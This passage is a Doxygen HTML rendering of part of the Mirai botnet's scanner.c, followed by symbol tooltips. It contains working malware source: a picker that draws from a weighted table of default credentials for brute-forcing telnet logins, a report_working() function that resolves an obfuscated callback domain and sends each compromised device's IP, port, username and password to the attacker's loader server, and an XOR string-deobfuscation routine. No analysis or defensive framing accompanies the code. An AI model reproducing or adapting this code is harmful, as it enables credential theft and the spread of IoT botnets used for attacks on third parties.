auth_table_max_weight + weight;</div><div class="line"><a name="l00882"></a><span class="lineno">  882</span>&#160;    auth_table_max_weight += weight;</div><div class="line"><a name="l00883"></a><span class="lineno">  883</span>&#160;}</div><div class="line"><a name="l00884"></a><span class="lineno">  884</span>&#160;</div><div class="line"><a name="l00885"></a><span class="lineno">  885</span>&#160;<span class="keyword">static</span> <span class="keyword">struct </span><a class="code" href="structscanner__auth.html">scanner_auth</a> *<a class="code" href="scanner_8h.html#a8b83be662fc81c21cc28445b9154176c">random_auth_entry</a>(<span class="keywordtype">void</span>)</div><div class="line"><a name="l00886"></a><span class="lineno">  886</span>&#160;{</div><div class="line"><a name="l00887"></a><span class="lineno">  887</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00888"></a><span class="lineno">  888</span>&#160;    uint16_t r = (uint16_t)(<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() % auth_table_max_weight);</div><div class="line"><a name="l00889"></a><span class="lineno">  889</span>&#160;</div><div class="line"><a name="l00890"></a><span class="lineno">  890</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; auth_table_len; i++)</div><div class="line"><a name="l00891"></a><span class="lineno">  891</span>&#160;    {</div><div class="line"><a name="l00892"></a><span class="lineno">  892</span>&#160;        <span class="keywordflow">if</span> (r &lt; auth_table[i].<a class="code" href="structscanner__auth.html#a9c11408e5fcf5f8f9843a492bb9b1a9a">weight_min</a>)</div><div class="line"><a name="l00893"></a><span class="lineno">  893</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00894"></a><span class="lineno">  894</span>&#160;        <span class="keywordflow">else</span> <span class="keywordflow">if</span> (r &lt; auth_table[i].<a class="code" href="structscanner__auth.html#ac1f99c887815fcb29fda89be5efed2c6">weight_max</a>)</div><div class="line"><a name="l00895"></a><span class="lineno">  895</span>&#160;            <span class="keywordflow">return</span> &amp;auth_table[i];</div><div class="line"><a name="l00896"></a><span class="lineno">  896</span>&#160;    }</div><div class="line"><a name="l00897"></a><span class="lineno">  897</span>&#160;</div><div class="line"><a name="l00898"></a><span class="lineno">  898</span>&#160;    <span class="keywordflow">return</span> NULL;</div><div class="line"><a name="l00899"></a><span class="lineno">  899</span>&#160;}</div><div class="line"><a name="l00900"></a><span class="lineno">  900</span>&#160;</div><div class="line"><a name="l00901"></a><span class="lineno">  901</span>&#160;<span class="keyword">static</span> <span class="keywordtype">void</span> <a class="code" href="scanner_8h.html#afb6d13bfddcca9aa6d466bb831c600e3">report_working</a>(<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a> daddr, uint16_t dport, <span class="keyword">struct</span> <a class="code" href="structscanner__auth.html">scanner_auth</a> *auth)</div><div class="line"><a name="l00902"></a><span class="lineno">  902</span>&#160;{</div><div class="line"><a name="l00903"></a><span class="lineno">  903</span>&#160;    <span class="keyword">struct </span>sockaddr_in addr;</div><div class="line"><a name="l00904"></a><span class="lineno">  904</span>&#160;    <span class="keywordtype">int</span> pid = fork(), fd;</div><div class="line"><a name="l00905"></a><span class="lineno">  905</span>&#160;    <span class="keyword">struct </span><a class="code" href="structresolv__entries.html">resolv_entries</a> *entries = NULL;</div><div class="line"><a name="l00906"></a><span class="lineno">  906</span>&#160;</div><div class="line"><a name="l00907"></a><span class="lineno">  907</span>&#160;    <span class="keywordflow">if</span> (pid &gt; 0 || pid == -1)</div><div class="line"><a name="l00908"></a><span class="lineno">  908</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00909"></a><span class="lineno">  909</span>&#160;</div><div class="line"><a name="l00910"></a><span class="lineno">  910</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_STREAM, 0)) == -1)</div><div class="line"><a name="l00911"></a><span class="lineno">  911</span>&#160;    {</div><div class="line"><a name="l00912"></a><span class="lineno">  912</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00913"></a><span class="lineno">  913</span>&#160;        printf(<span class="stringliteral">&quot;[report] Failed to call socket()\n&quot;</span>);</div><div class="line"><a name="l00914"></a><span class="lineno">  914</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00915"></a><span class="lineno">  915</span>&#160;        exit(0);</div><div class="line"><a name="l00916"></a><span class="lineno">  916</span>&#160;    }</div><div class="line"><a name="l00917"></a><span class="lineno">  917</span>&#160;</div><div class="line"><a name="l00918"></a><span class="lineno">  918</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a4e6214d35394b8de3a0eb9ed3f4d74a5">TABLE_SCAN_CB_DOMAIN</a>);</div><div class="line"><a name="l00919"></a><span class="lineno">  919</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a61681f81c214ba8539ebd133b4eaaa35">TABLE_SCAN_CB_PORT</a>);</div><div class="line"><a name="l00920"></a><span class="lineno">  920</span>&#160;</div><div class="line"><a name="l00921"></a><span class="lineno">  921</span>&#160;    entries = <a class="code" href="resolv_8c.html#a6eb2fe08d97f646f1bc49cfd80aba7eb">resolv_lookup</a>(<a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a4e6214d35394b8de3a0eb9ed3f4d74a5">TABLE_SCAN_CB_DOMAIN</a>, NULL));</div><div class="line"><a name="l00922"></a><span class="lineno">  922</span>&#160;    <span class="keywordflow">if</span> (entries == NULL)</div><div class="line"><a name="l00923"></a><span class="lineno">  923</span>&#160;    {</div><div class="line"><a name="l00924"></a><span class="lineno">  924</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00925"></a><span class="lineno">  925</span>&#160;        printf(<span class="stringliteral">&quot;[report] Failed to resolve report address\n&quot;</span>);</div><div class="line"><a name="l00926"></a><span class="lineno">  926</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00927"></a><span class="lineno">  927</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00928"></a><span class="lineno">  928</span>&#160;    }</div><div class="line"><a name="l00929"></a><span class="lineno">  929</span>&#160;    addr.sin_family = AF_INET;</div><div class="line"><a name="l00930"></a><span class="lineno">  930</span>&#160;    addr.sin_addr.s_addr = entries-&gt;<a class="code" href="structresolv__entries.html#acaba3f499c8df1106a5c1d59c5a8276e">addrs</a>[<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() % entries-&gt;<a class="code" href="structresolv__entries.html#ae8dc7d2d70c332fd5d30a18790e88d07">addrs_len</a>];</div><div class="line"><a name="l00931"></a><span class="lineno">  931</span>&#160;    addr.sin_port = *((<a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> *)<a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a61681f81c214ba8539ebd133b4eaaa35">TABLE_SCAN_CB_PORT</a>, NULL));</div><div class="line"><a name="l00932"></a><span class="lineno">  932</span>&#160;    <a class="code" href="resolv_8c.html#afddedcd192860f219d5bc41b48de7055">resolv_entries_free</a>(entries);</div><div class="line"><a name="l00933"></a><span class="lineno">  933</span>&#160;</div><div class="line"><a name="l00934"></a><span class="lineno">  934</span>&#160;    <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a4e6214d35394b8de3a0eb9ed3f4d74a5">TABLE_SCAN_CB_DOMAIN</a>);</div><div class="line"><a name="l00935"></a><span class="lineno">  935</span>&#160;    <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a61681f81c214ba8539ebd133b4eaaa35">TABLE_SCAN_CB_PORT</a>);</div><div class="line"><a name="l00936"></a><span class="lineno">  936</span>&#160;</div><div class="line"><a name="l00937"></a><span class="lineno">  937</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in)) == -1)</div><div class="line"><a name="l00938"></a><span class="lineno">  938</span>&#160;    {</div><div class="line"><a name="l00939"></a><span class="lineno">  939</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00940"></a><span class="lineno">  940</span>&#160;        printf(<span class="stringliteral">&quot;[report] Failed to connect to scanner callback!\n&quot;</span>);</div><div class="line"><a name="l00941"></a><span class="lineno">  941</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00942"></a><span class="lineno">  942</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00943"></a><span class="lineno">  943</span>&#160;        exit(0);</div><div class="line"><a name="l00944"></a><span class="lineno">  944</span>&#160;    }</div><div class="line"><a name="l00945"></a><span class="lineno">  945</span>&#160;</div><div class="line"><a name="l00946"></a><span class="lineno">  946</span>&#160;    uint8_t zero = 0;</div><div class="line"><a name="l00947"></a><span class="lineno">  947</span>&#160;    send(fd, &amp;zero, <span class="keyword">sizeof</span> (uint8_t), MSG_NOSIGNAL);</div><div class="line"><a name="l00948"></a><span class="lineno">  948</span>&#160;    send(fd, &amp;daddr, <span class="keyword">sizeof</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>), MSG_NOSIGNAL);</div><div class="line"><a name="l00949"></a><span class="lineno">  949</span>&#160;    send(fd, &amp;dport, <span class="keyword">sizeof</span> (uint16_t), MSG_NOSIGNAL);</div><div class="line"><a name="l00950"></a><span class="lineno">  950</span>&#160;    send(fd, &amp;(auth-&gt;<a class="code" href="structscanner__auth.html#a57891f0877155a744c8aae3d700bcb0e">username_len</a>), sizeof (uint8_t), MSG_NOSIGNAL);</div><div class="line"><a name="l00951"></a><span class="lineno">  951</span>&#160;    send(fd, auth-&gt;<a class="code" href="structscanner__auth.html#a6c84dac1e6b150aa887557303905d350">username</a>, auth-&gt;<a class="code" href="structscanner__auth.html#a57891f0877155a744c8aae3d700bcb0e">username_len</a>, MSG_NOSIGNAL);</div><div class="line"><a name="l00952"></a><span class="lineno">  952</span>&#160;    send(fd, &amp;(auth-&gt;<a class="code" href="structscanner__auth.html#aeaed9effc2bdafc88641e686b2580d9d">password_len</a>), sizeof (uint8_t), MSG_NOSIGNAL);</div><div class="line"><a name="l00953"></a><span class="lineno">  953</span>&#160;    send(fd, auth-&gt;<a class="code" href="structscanner__auth.html#a6bb9828bf02ee7f1305fc8bdd3a059c5">password</a>, auth-&gt;<a class="code" href="structscanner__auth.html#aeaed9effc2bdafc88641e686b2580d9d">password_len</a>, MSG_NOSIGNAL);</div><div class="line"><a name="l00954"></a><span class="lineno">  954</span>&#160;</div><div class="line"><a name="l00955"></a><span class="lineno">  955</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00956"></a><span class="lineno">  956</span>&#160;    printf(<span class="stringliteral">&quot;[report] Send scan result to loader\n&quot;</span>);</div><div class="line"><a name="l00957"></a><span class="lineno">  957</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00958"></a><span class="lineno">  958</span>&#160;</div><div class="line"><a name="l00959"></a><span class="lineno">  959</span>&#160;    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00960"></a><span class="lineno">  960</span>&#160;    exit(0);</div><div class="line"><a name="l00961"></a><span class="lineno">  961</span>&#160;}</div><div class="line"><a name="l00962"></a><span class="lineno">  962</span>&#160;</div><div class="line"><a name="l00963"></a><span class="lineno">  963</span>&#160;<span class="keyword">static</span> <span class="keywordtype">char</span> *<a class="code" href="scanner_8h.html#a82f55fd3cba4786206af43f82d84e92d">deobf</a>(<span class="keywordtype">char</span> *str, <span class="keywordtype">int</span> *len)</div><div class="line"><a name="l00964"></a><span class="lineno">  964</span>&#160;{</div><div class="line"><a name="l00965"></a><span class="lineno">  965</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00966"></a><span class="lineno">  966</span>&#160;    <span class="keywordtype">char</span> *cpy;</div><div class="line"><a name="l00967"></a><span class="lineno">  967</span>&#160;</div><div class="line"><a name="l00968"></a><span class="lineno">  968</span>&#160;    *len = <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(str);</div><div class="line"><a name="l00969"></a><span class="lineno">  969</span>&#160;    cpy = malloc(*len + 1);</div><div class="line"><a name="l00970"></a><span class="lineno">  970</span>&#160;</div><div class="line"><a name="l00971"></a><span class="lineno">  971</span>&#160;    <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(cpy, str, *len + 1);</div><div class="line"><a name="l00972"></a><span class="lineno">  972</span>&#160;</div><div class="line"><a name="l00973"></a><span class="lineno">  973</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; *len; i++)</div><div class="line"><a name="l00974"></a><span class="lineno">  974</span>&#160;    {</div><div class="line"><a name="l00975"></a><span class="lineno">  975</span>&#160;        cpy[i] ^= 0xDE;</div><div class="line"><a name="l00976"></a><span class="lineno">  976</span>&#160;        cpy[i] ^= 0xAD;</div><div class="line"><a name="l00977"></a><span class="lineno">  977</span>&#160;        cpy[i] ^= 0xBE;</div><div class="line"><a name="l00978"></a><span class="lineno">  978</span>&#160;        cpy[i] ^= 0xEF;</div><div class="line"><a name="l00979"></a><span class="lineno">  979</span>&#160;    }</div><div class="line"><a name="l00980"></a><span class="lineno">  980</span>&#160;</div><div class="line"><a name="l00981"></a><span class="lineno">  981</span>&#160;    <span class="keywordflow">return</span> cpy;</div><div class="line"><a name="l00982"></a><span class="lineno">  982</span>&#160;}</div><div class="line"><a name="l00983"></a><span class="lineno">  983</span>&#160;</div><div class="line"><a name="l00984"></a><span class="lineno">  984</span>&#160;<span class="keyword">static</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> <a class="code" href="connection_8c.html#a7822780437d0519e7c36c8e6a4419f3a">can_consume</a>(<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a> *conn, uint8_t *ptr, <span class="keywordtype">int</span> amount)</div><div class="line"><a name="l00985"></a><span class="lineno">  985</span>&#160;{</div><div class="line"><a name="l00986"></a><span class="lineno">  986</span>&#160;    uint8_t *end = conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a> + conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>;</div><div class="line"><a name="l00987"></a><span class="lineno">  987</span>&#160;</div><div class="line"><a name="l00988"></a><span class="lineno">  988</span>&#160;    <span class="keywordflow">return</span> ptr + amount &lt; end;</div><div class="line"><a name="l00989"></a><span class="lineno">  989</span>&#160;}</div><div class="line"><a name="l00990"></a><span class="lineno">  990</span>&#160;</div><div class="line"><a name="l00991"></a><span class="lineno">  991</span>&#160;<span class="preprocessor">#endif</span></div><div class="ttc" id="table_8h_html_a778dd0ebf9da419861e8352b5c13046c"><div class="ttname"><a href="table_8h.html#a778dd0ebf9da419861e8352b5c13046c">TABLE_SCAN_SYSTEM</a></div><div class="ttdeci">#define TABLE_SCAN_SYSTEM</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00040">table.h:40</a></div></div>
<div class="ttc" id="scanner_8h_html_a5cec20bfe7b1203987fc68744b51b46a"><div class="ttname"><a href="scanner_8h.html#a5cec20bfe7b1203987fc68744b51b46a">consume_user_prompt</a></div><div class="ttdeci">static int consume_user_prompt(struct scanner_connection *)</div></div>
<div class="ttc" id="structscanner__auth_html_a9c11408e5fcf5f8f9843a492bb9b1a9a"><div class="ttname"><a href="structscanner__auth.html#a9c11408e5fcf5f8f9843a492bb9b1a9a">scanner_auth::weight_min</a></div><div class="ttdeci">uint16_t weight_min</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00021">scanner.h:21</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="scanner_8h_html_afb6d13bfddcca9aa6d466bb831c600e3"><div class="ttname"><a href="scanner_8h.html#afb6d13bfddcca9aa6d466bb831c600e3">report_working</a></div><div class="ttdeci">static void report_working(ipv4_t, uint16_t, struct scanner_auth *)</div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="scanner_8h_html_afd93b8811d7ab9c46d9196d60ee06950"><div class="ttname"><a href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a></div><div class="ttdeci">static void add_auth_entry(char *, char *, uint16_t)</div></div>
<div class="ttc" id="scanner_8h_html_a73754b0ee96be3722127b3c7e0be8350"><div class="ttname"><a href="scanner_8h.html#a73754b0ee96be3722127b3c7e0be8350">scanner_kill</a></div><div class="ttdeci">void scanner_kill(void)</div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_af2f61b2c3c38da3f06a301c596b5b47d"><div class="ttname"><a href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a></div><div class="ttdeci">void util_zero(void *buf, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00080">util.c:80</a></div></div>
<div class="ttc" id="table_8h_html_ae37c352aff727690678d80789e9153a6"><div class="ttname"><a href="table_8h.html#ae37c352aff727690678d80789e9153a6">TABLE_SCAN_NCORRECT</a></div><div class="ttdeci">#define TABLE_SCAN_NCORRECT</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00044">table.h:44</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="scanner_8h_html_ae996c08c3150fc2db37f09479843eb82"><div class="ttname"><a href="scanner_8h.html#ae996c08c3150fc2db37f09479843eb82">consume_iacs</a></div><div class="ttdeci">static int consume_iacs(struct scanner_connection *)</div></div>
<div class="ttc" id="resolv_8h_html"><div class="ttname"><a href="resolv_8h.html">resolv.h</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="scanner_8h_html_a8b83be662fc81c21cc28445b9154176c"><div class="ttname"><a href="scanner_8h.html#a8b83be662fc81c21cc28445b9154176c">random_auth_entry</a></div><div class="ttdeci">static struct scanner_auth * random_auth_entry(void)</div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aaadf2e480fd246ff9e932039b223baed"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a></div><div class="ttdeci">uint32_t ipv4_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00013">includes.h:13</a></div></div>
<div class="ttc" id="structscanner__auth_html_a6bb9828bf02ee7f1305fc8bdd3a059c5"><div class="ttname"><a href="structscanner__auth.html#a6bb9828bf02ee7f1305fc8bdd3a059c5">scanner_auth::password</a></div><div class="ttdeci">char * password</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00020">scanner.h:20</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a181a242a15f441fe3eefe68330b0c8e3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a></div><div class="ttdeci">int util_strlen(char *str)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00021">util.c:21</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="resolv_8c_html_a6eb2fe08d97f646f1bc49cfd80aba7eb"><div class="ttname"><a href="resolv_8c.html#a6eb2fe08d97f646f1bc49cfd80aba7eb">resolv_lookup</a></div><div class="ttdeci">struct resolv_entries * resolv_lookup(char *domain)</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8c_source.html#l00067">resolv.c:67</a></div></div>
<div class="ttc" id="structscanner__auth_html_a6c84dac1e6b150aa887557303905d350"><div class="ttname"><a href="structscanner__auth.html#a6c84dac1e6b150aa887557303905d350">scanner_auth::username</a></div><div class="ttdeci">char * username</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00019">scanner.h:19</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a27b56c2508008233898cb5e1766593c1"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a27b56c2508008233898cb5e1766593c1">util_local_addr</a></div><div class="ttdeci">ipv4_t util_local_addr(void)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00234">util.c:234</a></div></div>
<div class="ttc" id="table_8c_html_a960bec3b47b287c42b06c26eb370ed67"><div class="ttname"><a href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a></div><div class="ttdeci">char * table_retrieve_val(int id, int *len)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00108">table.c:108</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="table_8h_html_a79e035097ac55fe0a2533ca035b07102"><div class="ttname"><a href="table_8h.html#a79e035097ac55fe0a2533ca035b07102">TABLE_SCAN_RESP</a></div><div class="ttdeci">#define TABLE_SCAN_RESP</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00043">table.h:43</a></div></div>
<div class="ttc" id="structscanner__connection_html_a3c7eb1f8350e4fe3474722cd78a77040"><div class="ttname"><a href="structscanner__connection.html#a3c7eb1f8350e4fe3474722cd78a77040">scanner_connection::dst_port</a></div><div class="ttdeci">uint16_t dst_port</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00042">scanner.h:42</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfa57cdd909acfa73d78890a49b7d9db9ab"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa57cdd909acfa73d78890a49b7d9db9ab">scanner_connection::SC_WAITING_PASSWD_RESP</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00034">scanner.h:34</a></div></div>
<div class="ttc" id="rand_8h_html"><div class="ttname"><a href="rand_8h.html">rand.h</a></div></div>
<div class="ttc" id="scanner_8h_html_ad4ec7558569ac7b11fca77e309fe2142"><div class="ttname"><a href="scanner_8h.html#ad4ec7558569ac7b11fca77e309fe2142">get_random_ip</a></div><div class="ttdeci">static ipv4_t get_random_ip(void)</div></div>
<div class="ttc" id="scanner_8h_html_a51caaf2e58a39d0e9a78aa3a633bde5e"><div class="ttname"><a href="scanner_8h.html#a51caaf2e58a39d0e9a78aa3a633bde5e">consume_any_prompt</a></div><div class="ttdeci">static int consume_any_prompt(struct scanner_connection *)</div></div>
<div class="ttc" id="scanner_8h_html_aec54f69564fbbbac5032deae9361438a"><div class="ttname"><a href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init</a></div><div class="ttdeci">void scanner_init()</div></div>
<div class="ttc" id="structscanner__auth_html_aeaed9effc2bdafc88641e686b2580d9d"><div class="ttname"><a href="structscanner__auth.html#aeaed9effc2bdafc88641e686b2580d9d">scanner_auth::password_len</a></div><div class="ttdeci">uint8_t password_len</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00022">scanner.h:22</a></div></div>
<div class="ttc" id="structresolv__entries_html_acaba3f499c8df1106a5c1d59c5a8276e"><div class="ttname"><a href="structresolv__entries.html#acaba3f499c8df1106a5c1d59c5a8276e">resolv_entries::addrs</a></div><div class="ttdeci">ipv4_t * addrs</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8h_source.html#l00007">resolv.h:7</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="structscanner__connection_html_a2df0a83fe9b12e23a5b4cb7177577a69"><div class="ttname"><a href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">scanner_connection::auth</a></div><div class="ttdeci">struct scanner_auth * auth</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00026">scanner.h:26</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfa3249bd9668855185501733f9bef09acf"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa3249bd9668855185501733f9bef09acf">scanner_connection::SC_HANDLE_IACS</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00031">scanner.h:31</a></div></div>
<div class="ttc" id="scanner_8h_html_a47b695dfa82350e16fa161fb30e3af0d"><div class="ttname"><a href="scanner_8h.html#a47b695dfa82350e16fa161fb30e3af0d">consume_pass_prompt</a></div><div class="ttdeci">static int consume_pass_prompt(struct scanner_connection *)</div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfa00fef5111c635b0656496fc72b109909"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa00fef5111c635b0656496fc72b109909">scanner_connection::SC_CONNECTING</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00030">scanner.h:30</a></div></div>
<div class="ttc" id="table_8h_html_a1ef90a6398b8126ff3a500acd6d6b566"><div class="ttname"><a href="table_8h.html#a1ef90a6398b8126ff3a500acd6d6b566">TABLE_SCAN_SHELL</a></div><div class="ttdeci">#define TABLE_SCAN_SHELL</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00038">table.h:38</a></div></div>
<div class="ttc" id="table_8h_html_a580e3d9937b4ebf6cf286fd2cd0820a7"><div class="ttname"><a href="table_8h.html#a580e3d9937b4ebf6cf286fd2cd0820a7">TABLE_SCAN_SH</a></div><div class="ttdeci">#define TABLE_SCAN_SH</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00041">table.h:41</a></div></div>
<div class="ttc" id="structscanner__connection_html"><div class="ttname"><a href="structscanner__connection.html">scanner_connection</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00025">scanner.h:25</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="table_8c_html_a0c03e9a9ebea1c0e6b98b969b56825b2"><div class="ttname"><a href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a></div><div class="ttdeci">void table_lock_val(uint8_t id)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00093">table.c:93</a></div></div>
